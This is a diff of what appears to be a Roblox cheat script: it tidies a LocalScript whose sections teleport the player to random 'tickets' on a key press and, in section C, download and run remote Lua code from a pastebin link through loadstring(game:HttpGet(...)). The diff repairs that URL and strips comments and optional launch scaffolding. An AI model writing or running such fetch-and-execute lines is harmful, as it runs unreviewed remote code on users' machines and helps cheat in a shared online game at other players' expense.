@@ -1,6 +1,5 @@
 -- LocalScript
 
--- Section A
 local function A()
     print("Running Script A")
     local player = game.Players.LocalPlayer
@@ -289,7 +288,6 @@ workspace.ChildRemoved:Connect(function(child)
 end)
 end
 
--- Section B
 local function B()
     print("Running Script B")
     local Players = game:GetService("Players")
@@ -342,38 +340,13 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         teleportToRandomTicket()
     end
 end)
-
 end
 
--- Section C
 local function C()
     print("Running Script C")
-    loadstring(game:HttpGet("https://pastebin.com/raw/raw/RXfzrMS4",true))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/RXfzrMS4",true))()
 end
 
--- Launch all three concurrently
 task.spawn(A)
 task.spawn(B)
 task.spawn(C)
-
--- Optional: sequential execution
--- A(); B(); C()
-
--- Optional: conditional toggles
-local runA, runB, runC = true, true, true
-if runA then task.spawn(A) end
-if runB then task.spawn(B) end
-if runC then task.spawn(C) end
-
--- Optional: simple error-wrap per section
-local function safeRun(fn, name)
-    local ok, err = pcall(fn)
-    if not ok then
-        warn(("Section %s failed: %s"):format(name, tostring(err)))
-    end
-end
-
--- Example: safe concurrent runs
-task.spawn(function() safeRun(A, "A") end)
-task.spawn(function() safeRun(B, "B") end)
-task.spawn(function() safeRun(C, "C") end)
